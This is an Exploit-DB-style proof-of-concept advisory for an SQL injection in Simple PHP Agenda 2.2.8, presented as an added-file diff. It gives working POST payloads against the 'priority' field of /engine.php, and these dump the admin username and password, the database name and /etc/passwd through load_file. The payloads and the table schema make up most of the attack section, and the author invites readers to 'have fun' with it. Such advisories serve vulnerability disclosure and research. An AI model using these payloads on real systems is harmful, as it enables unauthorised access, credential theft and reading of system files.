@@ -1,0 +1,57 @@
+# Title:Simple PHP Agenda 2.2.8 SQLi Vulnerability
+# Version: php-agenda 2.2.8
+# Author/Found by: loneferret
+# Manifacturer/Software link: http://sourceforge.net/projects/php-agenda/files/latest/download
+# Other vulnerability: http://www.exploit-db.com/exploits/18694/
+
+# Date found: May 7th 2012
+# Tested on: Ubuntu Server 8.04 / PHP Version 5.2.4-2ubuntu5.23
+
+# Vulnerability:
+# Due to improper input sanitization, the "priority" field when creating and adding an 
+# item in the "todo list" is subject to SQL injection. 
+
+# Severity:
+# Well if anyone actually uses this, I suppose it would be high. But if you're like me
+# and still use paper you should be safe.
+
+# As always you can have as much fun with this...
+
+Method: POST
+Parameter: priority
+Page: /engine.php
+Payload: action=addTodo&priority=[SQLi]&text=Destcription&newTODO=Add todo item
+
+PoC:
+We need to bleed in the text field to be able to display anything interesting.
+As the priority is only a "tinyint(4)". Text field is "text" so it can handle
+a bit more data.
+
+# mysql> describe todo;
+# +----------+------------+------+-----+---------+----------------+
+# | Field    | Type       | Null | Key | Default | Extra          |
+# +----------+------------+------+-----+---------+----------------+
+# | id       | int(11)    | NO   | PRI | NULL    | auto_increment | 
+# | user_id  | int(11)    | NO   | MUL | 0       |                | 
+# | priority | tinyint(4) | NO   |     | 0       |                | 
+# | text     | text       | NO   |     | NULL    |                | 
+# | added    | int(11)    | NO   |     | 0       |                | 
+# | status   | tinyint(4) | NO   |     | 0       |                | 
+# | closed   | int(11)    | NO   |     | 0       |                | 
+# +----------+------------+------+-----+---------+----------------+
+
+# So when pressing the "Add todo item" essentially issues this command to mysql:
+# insert into todo (`user_id`,`priority`,`text`,`added`) values(1,4,'hello',1336438388)
+
+Get first username and password (usually admin):
+POSTDATA=action=addTODO&priority=1,(select concat(username,0x3c,0x62,0x72,0x3e,password) from users limit 1),1336389812)#&text=hello&newTODO=Add+todo+item
+
+Get Database name:
+POSTDATA=action=addTODO&priority=1,(select database()),1336389812)#&text=hello&newTODO=Add+todo+item
+
+If mysql can do it, load /etc/passwd:
+POSTDATA=action=addTODO&priority=4,(SELECT load_file(0x2f6574632f706173737764)),1336389812)#&text=hello&newTODO=Add+todo+item
+
+
+# Nods to Exploit-DB, Offensive-Security for pretty much everything.
+#
